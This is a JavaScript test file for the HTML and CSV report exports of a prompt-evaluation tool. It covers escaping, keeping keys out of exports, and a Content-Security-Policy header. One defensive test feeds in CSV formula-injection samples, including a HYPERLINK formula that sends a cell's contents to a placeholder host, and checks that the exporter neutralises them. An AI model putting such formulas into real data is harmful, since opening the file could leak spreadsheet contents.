process.env.TZ = 'Europe/Warsaw'; // before any date is created: the expected dates below do not depend on the machine
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildReport, renderHtml, renderBody, formatLocal, formatIso, offsetLabel } from '../../app/public/src/report.mjs';
import { REPORT_CSS } from '../../app/public/src/report-style.mjs';
import { renderCsv } from '../../app/public/src/exports.mjs';
import { tokenize } from '../../app/public/src/dataset.mjs';
import { DEFAULT_MAIN_JSON, jsonText } from '../../app/public/src/defaults.mjs';
import { DEFAULT_MAIN_PROMPT, DEFAULT_ACCURACY_PROMPT, DEFAULT_COMPLETENESS_PROMPT } from '../../app/public/src/defaults.mjs';

const T_REPORT = Date.UTC(2026, 10, 1, 13, 25, 0); // 2026-11-01 14:25:00 in Warsaw (UTC+01:00)
const T_MAIN = Date.UTC(2026, 10, 1, 13, 24, 57);
const T_JUDGES = Date.UTC(2026, 10, 1, 13, 24, 59);
const LONG = `Selected indicators\tPoland\n${'Population (absolute number)\t36 497 495\n'.repeat(12)}`;
const TRICKY = 'a, "b"\nZażółć\tgęślą, jaźń\r\n<b>x</b> & "q"';

const ok = (grade, rationale, extra = {}) => ({ state: 'ok', grade, rationale, ...extra });
const row = (rowId, name, over = {}) => ({
  rowId, name, promptInput: `input of ${rowId}`, expectedResult: `expected of ${rowId}`, resolvedPrompt: `prompt ${rowId}`,
  main: { state: 'ok', output: `output of ${rowId}`, cutOff: false },
  similarity: 70, accuracy: ok(90, 'CORRECT (3): a; b; c'), completeness: ok(60, 'PRESENT (3): a; b; c'), ...over,
});
const fixtureRun = () => ({
  mode: 'full', status: 'finished', phase: { name: 'judges', done: 14, total: 14 }, failure: null,
  reportAt: T_REPORT, times: { main: T_MAIN, judges: T_JUDGES },
  snapshot: {
    prompts: { main: DEFAULT_MAIN_PROMPT, accuracy: DEFAULT_ACCURACY_PROMPT, completeness: DEFAULT_COMPLETENESS_PROMPT },
    params: { main: jsonText(DEFAULT_MAIN_JSON), judges: jsonText(DEFAULT_MAIN_JSON) },
    judgeSameAsMain: true,
    models: { main: DEFAULT_MAIN_JSON.model, judges: DEFAULT_MAIN_JSON.model },
    rowIds: ['R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7'],
  },
  rows: [
    row('R1', 'Ok row', { promptInput: LONG, similarity: 87, accuracy: ok(100, 'CORRECT (10)'), completeness: ok(56, 'PRESENT (10)', { previousGrade: 40 }) }),
    row('R2', 'Cut-off row', { main: { state: 'ok', output: 'half an answ', cutOff: true }, similarity: 40, accuracy: ok(80, 'x'), completeness: ok(60, 'y') }),
    row('R3', 'Main error', { main: { state: 'error', error: 'Rate limit exceeded (HTTP 429).' }, similarity: 'not available', accuracy: { state: 'nothing-to-judge' }, completeness: { state: 'nothing-to-judge' } }),
    row('R4', 'Judge errors', { similarity: 70,
      accuracy: { state: 'error', error: 'unreadable answer: no SCORE line was found', rawAnswer: 'The output looks correct.' },
      completeness: { state: 'error', error: 'The key was refused, or the model is not permitted for this key (HTTP 403).' } }),
    row('R5', 'No expected result', { expectedResult: '', similarity: 'no expected result', accuracy: ok(90, 'a'), completeness: ok(70, 'b') }),
    row('R6', 'Not run', { main: { state: 'not-run' }, similarity: 'not available', accuracy: { state: 'nothing-to-judge' }, completeness: { state: 'nothing-to-judge' } }),
    row('R7', 'Tricky, "text"', { promptInput: TRICKY, expectedResult: TRICKY, main: { state: 'ok', output: TRICKY, cutOff: false }, similarity: 100, accuracy: ok(60, 'r1, "q"\nline2'), completeness: ok(50, 'ü') }),
  ],
});

/** Text of the cells of the table with the given class, as rows of strings. */
function tableRows(html, cls, index = 0) {
  const tables = [...html.matchAll(new RegExp(`<table class="${cls}">([\\s\\S]*?)</table>`, 'g'))];
  return [...tables[index][1].matchAll(/<tr[^>]*>([\s\S]*?)<\/tr>/g)]
    .map((tr) => [...tr[1].matchAll(/<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/g)].map((c) => c[1].replace(/<[^>]+>/g, '').replace(/&amp;/g, '&').replace(/&quot;/g, '"').replace(/\s+/g, ' ').trim()));
}
const casesOf = (html) => [...html.matchAll(/<article class="case" id="(row-\d+)">([\s\S]*?)<\/article>/g)].map((m) => ({ id: m[1], html: m[2] }));
const fieldsOf = (caseHtml) => [...caseHtml.matchAll(/data-field="([\w-]+)"/g)].map((m) => m[1]);
const field = (caseHtml, name) => {
  const at = caseHtml.indexOf(`data-field="${name}"`);
  const rest = caseHtml.slice(at + 1);
  const next = [rest.indexOf('data-field="'), rest.indexOf('<div class="judges"')].filter((i) => i >= 0);
  return caseHtml.slice(at, at + 1 + Math.min(...next));
};
const metricsOf = (caseHtml) => [...caseHtml.matchAll(/<div class="metric" data-metric="(\w+)">([\s\S]*?)(?=<div class="metric"|<\/div><\/article>|$)/g)].map((m) => ({ name: m[1], html: m[2] }));

test('dates: local time in the HTML, ISO 8601 with offset in the CSV, fixed time zone', () => {
  assert.equal(formatLocal(T_REPORT), '2026-11-01 14:25:00');
  assert.equal(formatIso(T_REPORT), '2026-11-01T14:25:00+01:00');
  assert.equal(offsetLabel(T_REPORT), 'UTC+01:00');
  const summer = Date.UTC(2026, 6, 1, 10, 5, 9);
  assert.equal(formatLocal(summer), '2026-07-01 12:05:09');
  assert.equal(formatIso(summer), '2026-07-01T12:05:09+02:00');
  assert.equal(offsetLabel(summer), 'UTC+02:00');
});

test('buildReport: summary rows, states in place of blanks, averages', () => {
  const report = buildReport(fixtureRun());
  assert.deepEqual(report.summaryRows.map((r) => [r.label, r.similarity, r.accuracy, r.completeness]), [
    ['R1 – Ok row', '87%', '100%', '56%'],
    ['R2 – Cut-off row', '40%', '80%', '60%'],
    ['R3 – Main error', 'error', '–', '–'],
    ['R4 – Judge errors', '70%', 'error', 'error'],
    ['R5 – No expected result', 'no expected result', '90%', '70%'],
    ['R6 – Not run', '–', '–', '–'],
    ['R7 – Tricky, "text"', '100%', '60%', '50%'],
  ]);
  assert.deepEqual(report.averages, { similarity: '74%', accuracy: '83%', completeness: '59%' });
  assert.deepEqual(report.averageValues, { similarity: 74, accuracy: 83, completeness: 59 });
});

test('buildReport: facts of the header and the counts of the cards', () => {
  const report = buildReport(fixtureRun());
  assert.deepEqual(report.facts, { generatedAt: T_REPORT, cases: 7, model: 'nvidia/nemotron-3.5-bolt-e4b', judges: 'same model', failed: 3, noExpected: 1 });
  const own = fixtureRun();
  own.snapshot.judgeSameAsMain = false;
  own.snapshot.params.judges = '{"model":"judge-m"}';
  own.snapshot.models.judges = 'judge-m';
  assert.equal(buildReport(own).facts.judges, 'judge-m');
});

test('buildReport: a row still running shows …', () => {
  const run = fixtureRun();
  run.rows = [row('R1', 'Running', { main: { state: 'running' }, similarity: null, accuracy: { state: 'pending' }, completeness: { state: 'pending' } })];
  const [r] = buildReport(run).summaryRows;
  assert.deepEqual([r.similarity, r.accuracy, r.completeness], ['…', '…', '…']);
});

test('buildReport: averages with no values show – and no number', () => {
  const run = fixtureRun();
  run.rows = [run.rows[2], run.rows[5]];
  const report = buildReport(run);
  assert.deepEqual(report.averages, { similarity: '–', accuracy: '–', completeness: '–' });
  assert.deepEqual(report.averageValues, { similarity: null, accuracy: null, completeness: null });
});

test('buildReport: word differences are computed for rows with an output and an expected result', () => {
  const report = buildReport(fixtureRun());
  const [r1, , r3, , r5, r6] = report.rows;
  assert.ok(r1.diff.some((p) => p.type === 'del') && r1.diff.some((p) => p.type === 'ins'));
  assert.equal(r3.diff, null);
  assert.equal(r5.diff, null);
  assert.equal(r6.diff, null);
});

test('HTML: header band, average cards, summary, prompts, archive, results — in this order', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.match(html, /<title>Report – Prompt Runner<\/title>/);
  assert.match(html, /<h1>Report – Prompt Runner<\/h1>/);
  assert.match(html, /Report generated: <b>2026-11-01 14:25:00<\/b> \(UTC\+01:00\)/);
  const positions = ['class="hero"', 'class="kpis"', '<table class="sum">', '<table class="meta">', 'Prompts used (archive)', '<article class="case" id="row-0">'].map((s) => html.indexOf(s));
  assert.ok(positions.every((p) => p > 0), JSON.stringify(positions));
  assert.deepEqual([...positions].sort((a, b) => a - b), positions);
});

test('HTML: the header names the date, the number of test cases, and the models', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.match(html, /<span>7 test cases<\/span>/);
  assert.match(html, /<span>Model nvidia\/nemotron-3\.5-bolt-e4b<\/span>/);
  assert.match(html, /<span>Judges: same model<\/span>/);
});

test('HTML: the three averages in the cards equal the Average line of the summary table (SC-017)', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const cards = Object.fromEntries([...html.matchAll(/<div class="kpi" data-kpi="(\w+)" data-value="(\d+)">/g)].map((m) => [m[1], `${m[2]}%`]));
  const average = tableRows(html, 'sum').at(-1);
  assert.deepEqual([cards.similarity, cards.accuracy, cards.completeness], average.slice(1));
  assert.deepEqual(average, ['Average', '74%', '83%', '59%']);
  assert.match(html, /data-kpi="cases"[^>]*>[\s\S]*?<div class="big">7<\/div>[\s\S]*?3 failed · 1 without expected result/);
});

test('HTML: the summary table shows every state, bars only for numbers, and links to the cases', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const rows = tableRows(html, 'sum');
  assert.deepEqual(rows[0], ['Test case', 'Similarity', 'Accuracy', 'Completeness']);
  assert.deepEqual(rows[1], ['R1 Ok row', '87%', '100%', '56%']);
  assert.deepEqual(rows[3], ['R3 Main error', 'error', '–', '–']);
  assert.deepEqual(rows[5], ['R5 No expected result', 'no expected result', '90%', '70%']);
  assert.equal(rows.length, 9);
  for (const c of casesOf(html)) assert.ok(html.includes(`href="#${c.id}"`), `link to ${c.id}`);
  assert.equal((html.match(/<span class="bar"><i /g) ?? []).length, 4 + 4 + 4 + 3, 'a bar for every number: 4 similarities, 4 + 4 grades, and the three averages');
});

test('HTML: levels — green from 80, amber from 50, red below; the number is always written', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.match(html, /<span class="pill good">87%<\/span>/);
  assert.match(html, /<span class="pill low">40%<\/span>/);
  assert.match(html, /<span class="pill mid">70%<\/span>/);
  assert.match(html, /<span class="pill err">error<\/span>/);
  assert.match(html, /<div class="ring md good" style="--p:87"><span>87<small>%<\/small><\/span><\/div>/);
});

test('HTML: prompts table with model, parameters list, and generated date', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const rows = tableRows(html, 'meta');
  assert.deepEqual(rows[0], ['Prompt', 'Model', 'Parameters used', 'Generated']);
  const params = 'temperature=1, top_p=0.95, max_tokens=4096, seed=42, enable_thinking=true';
  assert.deepEqual(rows[1], ['Main prompt', 'nvidia/nemotron-3.5-bolt-e4b', params, '2026-11-01 14:24:57']);
  assert.deepEqual(rows[2], ['Judge – Accuracy', 'nvidia/nemotron-3.5-bolt-e4b', params, '2026-11-01 14:24:59']);
  assert.deepEqual(rows[3], ['Judge – Completeness', 'nvidia/nemotron-3.5-bolt-e4b', params, '2026-11-01 14:24:59']);
});

test('HTML: the archive is collapsed by default, holds the three prompts, and does not repeat the JSON', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.ok(!html.includes('<details open'));
  assert.match(html, /<details><summary>Prompts used \(archive\)<\/summary>/);
  assert.ok(html.includes('Summarize below data.') && html.includes('{prompt_input}') && html.includes('{output}'));
  assert.ok(!html.includes('Model and parameters (JSON)') && !html.includes('&quot;model&quot;'));
});

test('HTML: every case has the five fields in order and the two metrics one under the other', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const cases = casesOf(html);
  assert.equal(cases.length, 7);
  for (const c of cases) {
    assert.deepEqual(fieldsOf(c.html), ['prompt-input', 'expected', 'actual', 'similarity', 'differences'], c.id);
    assert.deepEqual(metricsOf(c.html).map((m) => m.name), ['Accuracy', 'Completeness'], c.id);
    assert.ok(!c.html.includes('<details'), 'nothing is collapsed');
  }
  assert.match(cases[0].html, /<header><span class="chip lg">R1<\/span><h3>Ok row<\/h3>/);
});

test('HTML: long texts are shown in full in scrolling boxes that the keyboard can reach', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const [c1] = casesOf(html);
  assert.ok(c1.html.includes(`${LONG.length} characters`));
  const input = field(c1.html, 'prompt-input');
  assert.ok(input.includes('Selected indicators') && input.includes('36 497 495'));
  assert.equal((input.match(/Population \(absolute number\)/g) ?? []).length, 12, 'the whole input is there');
  assert.match(input, /<div class="scroll mono" tabindex="0" role="region" aria-label="Prompt input of R1 – Ok row">/);
  for (const name of ['expected', 'actual', 'differences']) assert.match(field(c1.html, name), /<div class="scroll" tabindex="0" role="region" aria-label="[^"]+ of R1 – Ok row">/, name);
  for (const m of metricsOf(c1.html)) assert.match(m.html, /<div class="scroll rat" tabindex="0" role="region"/);
});

test('HTML: differences mark removed and added words, not only by color', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const diff = field(casesOf(html)[0].html, 'differences');
  assert.ok(diff.includes('<del>expected ') && diff.includes('<ins>output '));
});

test('HTML: states in the cases — previously, cut off, error, nothing to judge, raw answer, none, not run', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  const [c1, c2, c3, c4, c5, c6] = casesOf(html).map((c) => c.html);
  assert.ok(metricsOf(c1)[1].html.includes('previously 40%'));
  assert.ok(field(c2, 'actual').includes('half an answ') && field(c2, 'actual').includes('cut off at the length limit'));
  assert.ok(field(c3, 'actual').includes('<div class="alert"><b>error</b> Rate limit exceeded (HTTP 429).</div>'));
  assert.equal((c3.match(/nothing to judge/g) ?? []).length, 2);
  assert.ok(metricsOf(c4)[0].html.includes('unreadable answer: no SCORE line was found') && metricsOf(c4)[0].html.includes('The output looks correct.'));
  assert.ok(metricsOf(c4)[1].html.includes('(HTTP 403)'));
  assert.ok(field(c5, 'expected').includes('<span class="tag none">none</span>'));
  assert.ok(field(c5, 'differences').includes('no expected result'));
  assert.ok(field(c6, 'actual').includes('not run'));
});

test('HTML: a long input to compare gives a note instead of differences', () => {
  const run = fixtureRun();
  const big = Array.from({ length: 3000 }, (_, i) => `w${i}`).join(' ');
  run.rows = [row('R1', 'Big', { expectedResult: big, main: { state: 'ok', output: big.replace(/w/g, 'v'), cutOff: false } })];
  const html = renderHtml(buildReport(run));
  assert.ok(field(casesOf(html)[0].html, 'differences').includes('too long to compare'));
});

test('HTML: values are escaped', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.ok(!html.includes('<b>x</b> &'), 'raw markup from a value never appears');
  assert.ok(html.includes('&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;'));
});

test('the HTML export is self-contained: the shared CSS inline, no script, no external reference, no toolbar, no key, no endpoint', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.ok(html.includes(REPORT_CSS));
  assert.match(html, /<body class="rpt">/);
  assert.ok(!/<script/i.test(html));
  assert.ok(!/(https?:)?\/\//.test(html), 'no external address');
  assert.ok(!/<link|<img|<iframe|src=|@import|url\(/i.test(html));
  assert.ok(!html.includes('SECRET-TEST-KEY') && !html.includes('nvapi-'));
  assert.ok(!html.includes('Back to the form') && !html.includes('Export HTML'));
});

test('renderBody (the page) has the same content as the export', () => {
  const report = buildReport(fixtureRun());
  assert.ok(renderHtml(report).includes(renderBody(report)));
});

const PARAMS = 'temperature=1, top_p=0.95, max_tokens=4096, seed=42, enable_thinking=true';

test('CSV: BOM, CRLF, every field quoted, header of 17 columns in order', () => {
  const csv = renderCsv(buildReport(fixtureRun()));
  assert.equal(csv.charCodeAt(0), 0xfeff);
  const body = csv.slice(1);
  assert.match(body, /^(?:"(?:[^"]|"")*"(?:,|\r\n))+$/, 'only quoted fields, comma between them, CRLF ending each record');
  const records = tokenize(body, ',');
  assert.deepEqual(records[0], ['ID', 'Scenario', 'Prompt input', 'Actual output', 'Expected result', 'Similarity to expected output (%)',
    'Accuracy - Grade', 'Accuracy - Rationale', 'Completeness - Grade', 'Completeness - Rationale', 'Status',
    'Model main', 'Model judges', 'Parameters main', 'Parameters judges', 'Generated main', 'Generated judges']);
  assert.equal(records.length, 8, 'header plus one line per row');
  assert.ok(records.every((r) => r.length === 17));
});

test('CSV: the columns of each kind of row', () => {
  const records = tokenize(renderCsv(buildReport(fixtureRun())).slice(1), ',');
  const model = 'nvidia/nemotron-3.5-bolt-e4b';
  const tail = [model, model, PARAMS, PARAMS, '2026-11-01T14:24:57+01:00', '2026-11-01T14:24:59+01:00'];
  assert.deepEqual(records[1], ['R1', 'Ok row', LONG, 'output of R1', 'expected of R1', '87', '100', 'CORRECT (10)', '56', 'PRESENT (10)', 'ok', ...tail]);
  assert.equal(records[2][10], 'ok (cut off at the length limit)');
  assert.deepEqual(records[3].slice(3, 11), ['', 'expected of R3', '', '', '', '', '', 'Rate limit exceeded (HTTP 429).']);
  assert.deepEqual(records[4].slice(5, 10), ['70', 'error', 'unreadable answer: no SCORE line was found\nRaw answer: The output looks correct.', 'error', 'The key was refused, or the model is not permitted for this key (HTTP 403).']);
  assert.deepEqual(records[5].slice(4, 6), ['', '']);
  assert.equal(records[6][10], 'not run');
  assert.deepEqual(records[6].slice(5, 10), ['', '', '', '', '']);
});

test('CSV: values re-parsed by the dataset tokenizer equal the input (commas, quotes, line breaks, Polish characters)', () => {
  const records = tokenize(renderCsv(buildReport(fixtureRun())).slice(1), ',');
  const r7 = records[7];
  assert.equal(r7[0], 'R7');
  assert.equal(r7[1], 'Tricky, "text"');
  assert.equal(r7[2], TRICKY);
  assert.equal(r7[3], TRICKY);
  assert.equal(r7[4], TRICKY);
  assert.equal(r7[7], 'r1, "q"\nline2');
  assert.equal(r7[9], 'ü');
});

test('CSV: no key, no endpoint, no prompts or averages', () => {
  const csv = renderCsv(buildReport(fixtureRun()));
  assert.ok(!csv.includes('SECRET-TEST-KEY') && !csv.includes('nvapi-') && !/https?:/.test(csv));
  assert.ok(!csv.includes('Summarize below data') && !csv.includes('Average'));
});

test('CSV: a judge prompt that was never run has empty generated date', () => {
  const run = fixtureRun();
  run.times.judges = null;
  const records = tokenize(renderCsv(buildReport(run)).slice(1), ',');
  assert.equal(records[1][16], '');
  assert.equal(records[1][15], '2026-11-01T14:24:57+01:00');
});

test('judge prompt versions: the prompts table notes the grades from an earlier version and the archive keeps that version (spec FR-035)', () => {
  const run = fixtureRun();
  run.snapshot.judgePromptVersions = { accuracy: ['OLD ACCURACY PROMPT {prompt_input} {output}', run.snapshot.prompts.accuracy], completeness: [run.snapshot.prompts.completeness] };
  run.rows[0].accuracy.version = 0;
  run.rows[1].accuracy.version = 0;
  run.rows[4].accuracy.version = 1;
  run.rows[6].accuracy.version = 1;
  const report = buildReport(run);
  assert.equal(report.promptRows[1].note, '2 grades from an earlier version of the prompt');
  assert.equal(report.promptRows[2].note, '');
  const html = renderHtml(report);
  const rows = tableRows(html, 'meta');
  assert.ok(rows[2][2].endsWith('2 grades from an earlier version of the prompt'));
  assert.ok(!rows[3][2].includes('earlier version'));
  assert.match(html, /<h4>Judge – Accuracy – earlier version \(2 grades\)<\/h4><div class="box">OLD ACCURACY PROMPT/);
  run.rows[1].accuracy.version = 1;
  assert.equal(buildReport(run).promptRows[1].note, '1 grade from an earlier version of the prompt');
  run.rows[0].accuracy.version = 1;
  assert.equal(buildReport(run).promptRows[1].note, '', 'no grade left from the earlier version: no note, no archive entry');
  assert.ok(!renderHtml(buildReport(run)).includes('earlier version ('));
});

test('very long values: the report is built fast, the differences say the texts are too long, the full text is in the HTML and the CSV (FR-006, FR-023)', () => {
  const run = fixtureRun();
  const big = Array.from({ length: 20000 }, (_, i) => `word${i}`).join(' ').slice(0, 100_000);
  const other = Array.from({ length: 20000 }, (_, i) => `term${i}`).join(' ').slice(0, 100_000);
  const rat = 'rationale line\n'.repeat(8000).slice(0, 100_000);
  run.rows = [row('R1', 'Huge', { promptInput: big, expectedResult: big, main: { state: 'ok', output: other, cutOff: false }, accuracy: ok(70, rat), completeness: ok(60, rat) })];
  const started = performance.now();
  const report = buildReport(run);
  const html = renderHtml(report);
  const csv = renderCsv(report);
  assert.ok(performance.now() - started < 1000, `took ${Math.round(performance.now() - started)} ms`);
  assert.ok(field(casesOf(html)[0].html, 'differences').includes('too long to compare'));
  assert.ok(html.includes(big) && html.includes(other) && html.includes(esc100(rat)));
  const records = tokenize(csv.slice(1), ',');
  assert.equal(records[1][2], big);
  assert.equal(records[1][3], other);
  assert.equal(records[1][7], rat);
});
const esc100 = (text) => text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');


// ---- Corrections after the code review (spec User Story 8) ----

test('the judge model of the report follows the archived parameters, not the check box (FR-042)', () => {
  // The check box says "same model", but a judge re-run used another JSON: the report must name that model.
  const run = fixtureRun();
  run.snapshot.judgeSameAsMain = true;
  run.snapshot.params.judges = '{"model":"judge-b","temperature":0.1}';
  run.snapshot.models.judges = 'judge-b';
  const report = buildReport(run);
  assert.equal(report.facts.judges, 'judge-b');
  assert.equal(report.promptRows[1].model, 'judge-b');
  assert.equal(report.promptRows[2].model, 'judge-b');
  assert.equal(report.promptRows[1].params, 'temperature=0.1');
  assert.equal(report.archive.judgesJson, '{"model":"judge-b","temperature":0.1}', 'the judges\' JSON is in the archive');
  assert.match(renderBody(report), /Judges: judge-b/);
  const csv = tokenize(renderCsv(report).slice(1), ',');
  assert.equal(csv[1][12], 'judge-b');
  assert.equal(csv[1][14], 'temperature=0.1');
});

test('"same model" is said only when the parameters are identical, whatever the check box says (FR-042)', () => {
  const run = fixtureRun();
  run.snapshot.judgeSameAsMain = false;                       // the option was switched off ...
  run.snapshot.params.judges = '{"seed":42,"model":"nvidia/nemotron-3.5-bolt-e4b","max_tokens":4096,"top_p":0.95,"temperature":1,"chat_template_kwargs":{"enable_thinking":true}}'; // ... but the same JSON, other key order
  const report = buildReport(run);
  assert.equal(report.facts.judges, 'same model');
  assert.equal(report.archive.judgesJson, null);
});

test('something shaped like a key inside the parameters is hidden in the report and in the CSV (FR-045)', () => {
  const run = fixtureRun();
  run.snapshot.params.main = '{"model":"m-nvapi-SHOULD-NOT-SHOW","note":"nvapi-ABC123_def-456","temperature":1}';
  run.snapshot.models.main = 'm-nvapi-SHOULD-NOT-SHOW';
  run.snapshot.params.judges = run.snapshot.params.main;
  run.snapshot.models.judges = run.snapshot.models.main;
  const report = buildReport(run);
  const everything = JSON.stringify(report) + renderHtml(report) + renderCsv(report);
  assert.ok(!everything.includes('nvapi-'), 'no key-shaped text anywhere');
  assert.match(report.promptRows[0].params, /note=\[key\]/);
});

test('the HTML export cannot load anything even when opened from disk (FR-046)', () => {
  const html = renderHtml(buildReport(fixtureRun()));
  assert.match(html, /<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'">/);
  assert.ok(!/<script/i.test(html));
});

test('CSV: a text that a spreadsheet could evaluate gets a leading quote; numbers and dates are untouched (FR-026)', () => {
  const run = fixtureRun();
  const trigger = ['=HYPERLINK("http://x/?"&A2,"click")', '+1+1', '-1+1', '@SUM(A1)', '\tTAB', '\rCR'];
  run.rows = [
    row('=R1', '-Name', { promptInput: '=1+1', expectedResult: '@x', main: { state: 'ok', output: trigger[0], cutOff: false },
      accuracy: ok(90, trigger[1]), completeness: ok(60, '- a bullet\n- another') }),
    row('R2', 'Plain', { main: { state: 'ok', output: trigger[4], cutOff: false }, accuracy: ok(10, trigger[5]), completeness: { state: 'error', error: '-5 is not allowed' } }),
  ];
  const records = tokenize(renderCsv(buildReport(run)).slice(1), ',');
  const [one, two] = [records[1], records[2]];
  assert.equal(one[0], "'=R1");
  assert.equal(one[1], "'-Name");
  assert.equal(one[2], "'=1+1");
  assert.equal(one[3], `'${trigger[0]}`);
  assert.equal(one[4], "'@x");
  assert.equal(one[7], "'+1+1");
  assert.equal(one[9], "'- a bullet\n- another");
  assert.equal(two[3], "'\tTAB");
  assert.equal(two[7], "'\rCR");
  assert.equal(two[8], 'error', 'a grade column that says "error" is a word, not text of the model');
  assert.equal(two[9], "'-5 is not allowed", 'the rationale column carries the error text');
  assert.equal(one[5], '70', 'similarity is written as a number');
  assert.equal(one[6], '90', 'a grade is written as a number');
  assert.match(one[15], /^\d{4}-\d\d-\d\dT/, 'a date is written as a date');
  assert.equal(records[2][0], 'R2', 'a text that does not start with a trigger character has no quote');
  assert.ok(!renderHtml(buildReport(run)).includes("'=1+1"), 'the HTML export is not changed');
});

test('the word differences are computed once for an unchanged row, again for a changed one (FR-047)', () => {
  const run = fixtureRun();
  const first = buildReport(run);
  const again = buildReport(run);
  assert.ok(first.rows[0].diff, 'the fixture row has differences');
  assert.equal(again.rows[0].diff, first.rows[0].diff, 'the same array: nothing was recomputed');

  run.rows[0].main = { state: 'ok', output: 'a different answer', cutOff: false }; // a changed outcome is a new object
  const changed = buildReport(run);
  assert.notEqual(changed.rows[0].diff, first.rows[0].diff);
  assert.ok(changed.rows[0].diff.some((part) => part.text.includes('different')));
});
